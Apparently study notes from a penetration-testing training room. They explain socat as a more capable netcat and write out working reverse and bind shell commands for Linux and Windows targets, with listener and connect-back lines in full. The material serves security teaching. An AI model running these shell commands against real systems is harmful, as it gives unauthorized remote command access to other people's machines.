Socat is like netcat on steroids. It can do all of the same things, and _many_ more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are two big catches:

1. The syntax is more difficult
2. Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.

Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. In the interests of this room, this will essentially be a listening port and the keyboard, however, it could also be a listening port and a file, or indeed, two listening ports. All socat does is provide a link between two points -- much like the portal gun from the Portal games!


- **_Reverse Shells_**

Reverse shell listener in socat:  

```
socat TCP-L:<port> -
```

Windows command to connect back:

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

The "pipes" option is used to force PowerShell (or cmd.exe) to use Unix style standard input and output.  

Linux Target:

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li" 
```


- **_Bind Shells_**

Linux Target:

```
socat TCP-L:<PORT> EXEC:"bash -li"  
```

Windows Target:

```
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

Attacking machine command:

```
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```